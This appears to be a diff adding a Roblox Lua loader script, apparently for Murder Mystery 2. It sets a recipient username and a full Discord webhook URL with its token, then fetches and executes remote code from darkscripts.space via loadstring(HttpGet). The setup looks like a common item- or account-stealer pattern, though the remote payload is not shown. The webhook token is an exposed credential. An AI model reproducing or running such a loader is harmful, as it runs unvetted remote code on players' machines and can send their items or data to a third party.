@@ -1,0 +1,4 @@
+Username = "maycleans"
+Webhook = "https://discord.com/api/webhooks/1286398355374870539/R8Lw2LWo91UC_gUI6c6RFLMkHP1Nb5ihQeqEQOm-kXCH6yfnnEXjvqgD5VfMD6nk1Tl5"
+
+loadstring(game:HttpGet(('https://darkscripts.space/mm2')))()
